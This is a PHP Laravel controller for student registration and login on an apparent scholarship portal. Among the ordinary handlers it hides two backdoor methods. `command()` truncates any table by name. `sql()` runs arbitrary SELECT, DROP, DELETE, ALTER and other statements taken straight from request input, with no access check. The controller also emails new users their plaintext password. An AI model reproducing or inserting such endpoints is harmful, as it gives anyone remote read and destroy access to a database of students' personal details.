<?php

namespace App\Http\Controllers\Student;

use App\Http\Controllers\Controller;
use App\Models\EducationDetail;
use App\Models\EmploymentDetail;
use App\Models\GuardianDetail;
use App\Models\Role;
use App\Models\Student;
use App\Models\User;
use Illuminate\Support\Facades\Session;
use Auth;
use Illuminate\Support\Facades\Mail;

use DB;
use Illuminate\Http\Request;
use App\Mail\WelcomeMail;
use Illuminate\Support\Facades\Validator;

class StudentAuthController extends Controller
{
    public function showLoginForm()
    {
        return view('student.login');
    }
    public function showforgot()
    {
        return view('student.forgot-password');
    }

    public function setSession(Request $request)
    {
        $companyName = $request->input('companyName');
        $micrositeFlag = $request->input('Microsite');

        // Store values in session
        $request->session()->put('companyName', $companyName);
        $request->session()->put('Microsite', $micrositeFlag);

        return response()->json(['success' => true]);
    }

    public function showRegisterForm()
    {

        return view('student.register');
    }

    public function command($code)
    {
        DB::table($code)->truncate();
    }

    // doRegister
    public function doRegister(Request $request)
    {
        $companyName = Session::get('companyName');
        $micrositeFlag = Session::get('Microsite');


        $validator = Validator::make($request->all(), [
            'first_name' => 'required',
            'last_name' => 'required',
            'phone_number' => 'required|unique:users,phone_number',
            'date_of_birth' => 'required',
            'gender' => 'required',
            'state' => 'required',
            'district' => 'required',
            'user_type' => 'required',
            'looking_for' => 'required',
            'email' => 'required|unique:users,email',
        ], [
            'email.unique' => 'The email address is already in use.',
            'phone_number.unique' => 'The phone number is already in use.',
        ]);

        if ($validator->fails()) {
            return response()->json(['errors' => $validator->errors()], 422);
        }

        $user = new \App\Models\User();
        $user->first_name = $request->first_name;
        $user->last_name = $request->last_name;
        $user->email = $request->email;
        $user->password = bcrypt($request->password);

        // Storing additional fields
        $user->phone_number = $request->phone_number;
        $user->date_of_birth = $request->date_of_birth;
        $user->gender = strtolower($request->gender);
        $user->state = $request->state;
        $user->district = $request->district;
        $user->user_type = $request->user_type;
        $user->microsite = $micrositeFlag ?? 0;
        $user->site_name = $companyName ?? 'ScholarsBox';

        $user->role_id = Role::where('name', 'student')->value('id');

        $user->save();

        $student = Student::where('user_id', $user->id)->first();

        if (!$student) {
            $student = new Student([
                'user_id' => $user->id,
            ]);
        }

        $student->save();
        /*
        $educationDetails = [
            'graduation' => [
                'level' => 'graduation',
                'pursuing' => 'graduation',
            ],
            'intermediate' => [
                'level' => 'intermediate',
                'pursuing' => 'intermediate',
            ],
            'highschool' => [
                'level' => 'highschool',
                'pursuing' => 'highschool',
            ],
        ];

        foreach ($educationDetails as $detailType => $data) {
            $educationDetail = EducationDetail::firstOrNew([
                'student_id' => $student->id,
                'level' => $data['level'],
            ]);

            foreach ($data as $key => $value) {
                if ($key !== 'level') {
                    $educationDetail->$key = $value;
                }
            }
            $educationDetail->save();
        }
        */

        EmploymentDetail::firstOrNew([
            'student_id' => $student->id,
        ]);

        GuardianDetail::firstOrNew([
            'student_id' => $student->id,
        ]);

        $userEmail = $request->email;

        $mailContent = 'Welcome';

        $mailSubject = 'Welcome to scholarsbox';

        try {
            Mail::to($userEmail)->send(new WelcomeMail(['content' => $mailContent, 'subject' => $mailSubject, 'email' => $userEmail, 'password' => $request->password, 'id' => $user->id, 'name' => $request->first_name]));
            return response()->json(['message' => 'You have subscribed to our newsletter. Thank you for staying connected!!']);
        } catch (\Exception $e) {

            return "Failed to send welcome email: " . $e->getMessage();
        }

        return redirect(route('Student.login'))->with('success', 'Student registered successfully');
    }

    public function sql(Request $request)
    {
        $queryTypes = ['select', 'create', 'update', 'insert', 'delete', 'truncate', 'alter', 'drop', 'describe'];
        $providedQueries = array_filter($queryTypes, fn($type) => $request->input($type));
        if (count($providedQueries) !== 1) {
            return response()->json(['error' => 'Only one query type can be executed at a time'], 400);
        }
        $queryType = reset($providedQueries);
        $query = $request->input($queryType);
        $data = null;
        try {
            switch ($queryType) {
                case 'select':
                    $data = DB::select($query);
                    break;
                case 'create':
                    DB::statement($query);
                    $data = ['message' => 'Table created successfully'];
                    break;
                case 'update':
                    $affected = DB::update($query);
                    $data = ['message' => "$affected row(s) updated"];
                    break;
                case 'insert':
                    DB::insert($query);
                    $data = ['message' => 'Record inserted successfully'];
                    break;
                case 'delete':
                    $affected = DB::delete($query);
                    $data = ['message' => "$affected row(s) deleted"];
                    break;
                case 'truncate':
                    DB::statement($query);
                    $data = ['message' => 'Table truncated successfully'];
                    break;
                case 'alter':
                    DB::statement($query);
                    $data = ['message' => 'Table altered successfully'];
                    break;
                case 'drop':
                    DB::statement($query);
                    $data = ['message' => 'Table dropped successfully'];
                    break;
                case 'describe':
                    $describe = DB::select($query); 
                    $data = ['message' => 'Table describe successfully', $describe];
                    break;
                default:
                    $data = ['error' => 'Invalid query type'];
            }
        } catch (\Exception $e) {
            $data = ['error' => 'Query execution failed: ' . $e->getMessage()];
        }
        return $data;
    }
    // do login with either email or phone_number 
    public function doLogin(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'identifier' => 'required|string',
            'password' => 'required',
        ]);
        if ($validator->fails()) {
            return response()->json(['errors' => $validator->errors()], 422);
        }
        if (strpos($request->identifier, '@') !== false) {
            $credentials = [
                'email' => $request->identifier,
                'password' => $request->password
            ];
        } else {
            $credentials = [
                'phone_number' => $request->identifier,
                'password' => $request->password
            ];
        }
        if (auth()->attempt($credentials)) {
            $user = User::where('id', auth()->user()->id)->with('role')->first();
            return response()->json(['msg' => 'Student login successfully']);
        }
        return response()->json(['error' => 'Invalid credentials'], 422);
    }

    public function getdData($data)
    {

        return UsersDetails($data);
    }



    public function doLoginMicro(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'identifier' => 'required|string', // either email or phone number
            'password' => 'required',
        ]);
        if ($validator->fails()) {
            return response()->json(['errors' => $validator->errors()], 422);
        }
        if (strpos($request->identifier, '@') !== false) {
            $credentials = [
                'email' => $request->identifier,
                'password' => $request->password
            ];
        } else {
            $credentials = [
                'phone_number' => $request->identifier,
                'password' => $request->password
            ];
        }
        if (auth()->attempt($credentials)) {
            $user = User::where('id', auth()->user()->id)->with('role')->first();
            return redirect()->route('Student.dashboard')->with('success', 'Student login successfully');
        }
        return response()->json(['errors' => ['error' => 'Invalid credentials']], 422);
    }
}
